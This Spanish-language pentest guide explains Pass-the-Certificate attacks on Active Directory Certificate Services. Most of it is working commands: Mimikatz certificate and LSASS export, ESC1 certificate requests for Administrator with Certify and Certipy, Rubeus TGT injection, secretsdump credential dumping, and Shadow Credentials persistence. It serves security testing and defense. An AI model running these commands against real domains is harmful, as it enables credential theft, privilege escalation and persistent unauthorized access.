# Pass-the-Certificate

Pass-the-Certificate explota la infraestructura de PKI de Active Directory (AD CS — Active Directory Certificate Services) para obtener TGTs usando certificados en lugar de contraseñas o hashes. Es una técnica de movimiento lateral y persistencia particularmente resistente a resets de contraseña: mientras el certificado sea válido (típicamente 1-2 años), permite autenticarse como el usuario o máquina objetivo.

### Por qué funciona

AD CS permite a usuarios y máquinas del dominio solicitar certificados que sirven como credenciales de autenticación Kerberos (PKINIT). Si se obtiene el certificado privado de una cuenta (usuario o equipo), se puede solicitar un TGT para esa cuenta sin conocer su contraseña ni su hash NT.

Es especialmente relevante porque:

* Los certificados tienen vida larga (1-2 años típicamente)
* Un reset de contraseña **no invalida** los certificados emitidos
* AD CS suele estar mal configurado y permite escaladas de privilegios (ESC1-ESC8)

### Extracción de certificados existentes

#### Desde Windows — Mimikatz

```
# Exportar certificados del almacén personal del usuario actual
crypto::certificates /export

# Exportar incluyendo clave privada (requiere privilegios)
crypto::certificates /export /systemstore:LOCAL_MACHINE

# Desde LSASS (certificados de sesiones activas)
sekurlsa::certificates
```

#### Desde Windows — Rubeus / Certify

```cmd
# Certify — enumerar plantillas de certificado vulnerables
Certify.exe find /vulnerable

# Solicitar certificado para otro usuario si la plantilla lo permite (ESC1)
Certify.exe request /ca:DC01\CA-EMPRESA /template:VulnerableTemplate /altname:Administrator

# El resultado es un archivo .pem — convertir a .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Desde Linux — Certipy

`Certipy` es la herramienta de referencia para ataques a AD CS desde Linux:

```bash
pip install certipy-ad

# Enumerar CA y plantillas vulnerables
certipy find -u jsmith@dominio.local -p Password123 -dc-ip 192.168.1.10

# Solicitar certificado (ESC1 — plantilla permite SAN arbitrario)
certipy req -u jsmith@dominio.local -p Password123 -dc-ip 192.168.1.10 \
  -ca CA-EMPRESA -template VulnerableTemplate -upn Administrator@dominio.local

# El resultado es un archivo Administrator.pfx
```

### Autenticación con el certificado

Una vez obtenido el `.pfx`, se usa para solicitar un TGT:

#### Desde Windows — Rubeus

```cmd
# Solicitar TGT con el certificado e inyectarlo en la sesión
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:export_password /ptt

# Verificar
klist
dir \\dc01\C$
```

#### Desde Linux — Certipy

```bash
# Solicitar TGT usando el certificado
certipy auth -pfx Administrator.pfx -dc-ip 192.168.1.10

# Certipy devuelve el TGT como .ccache y también el hash NT (via PKINIT FAST)
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dominio.local/Administrator@dc01.dominio.local
```

### Persistencia con Shadow Credentials

Shadow Credentials es una técnica que añade una clave de credencial (un certificado) directamente al atributo `msDS-KeyCredentialLink` de un objeto AD. Esto permite autenticarse como ese objeto usando PKINIT sin modificar su contraseña:

```bash
# Con Certipy — añadir shadow credential a una cuenta (requiere permisos de escritura sobre el objeto)
certipy shadow auto -u jsmith@dominio.local -p Password123 -dc-ip 192.168.1.10 -account targetuser

# Con Pywhisker (alternativa)
python3 pywhisker.py -d dominio.local -u jsmith -p Password123 --target targetuser --action add
```

### Vulnerabilidades ESC — resumen

AD CS tiene vectores de escalada bien documentados. Los más explotados:

| ESC      | Descripción                                                            |
| -------- | ---------------------------------------------------------------------- |
| **ESC1** | Plantilla permite SAN arbitrario + cualquier usuario puede inscribirse |
| **ESC2** | Plantilla de cualquier propósito inscribible por usuarios              |
| **ESC3** | Plantilla de agente de inscripción permite solicitar certs para otros  |
| **ESC4** | ACL débil sobre la plantilla (usuario puede modificarla)               |
| **ESC8** | Relay NTLM a la interfaz HTTP de AD CS (Web Enrollment)                |

```bash
# Enumerar con Certipy
certipy find -u jsmith@dominio.local -p Password123 -dc-ip 192.168.1.10 -vulnerable -stdout
```

> Pass-the-Certificate es actualmente uno de los vectores más robustos de persistencia en AD porque sobrevive a resets de contraseña. Si se compromete una CA interna mal configurada, el impacto puede ser equivalente a comprometer `krbtgt`.

> Microsoft Defender for Identity tiene detección para solicitudes de certificado anómalas (ESC1, ESC8) desde su versión 2022.x en adelante, pero la cobertura de ESC4 y técnicas basadas en Shadow Credentials es aún limitada.
